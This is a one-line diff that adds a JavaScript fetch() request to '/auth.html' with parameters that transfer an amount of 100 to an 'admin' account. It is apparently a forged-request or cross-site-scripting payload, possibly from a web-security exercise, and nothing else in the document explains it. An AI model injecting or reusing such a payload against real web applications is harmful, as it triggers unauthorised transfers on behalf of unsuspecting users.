@@ -1,0 +1,1 @@
+fetch('/auth.html?transferTo=admin&amount=100');
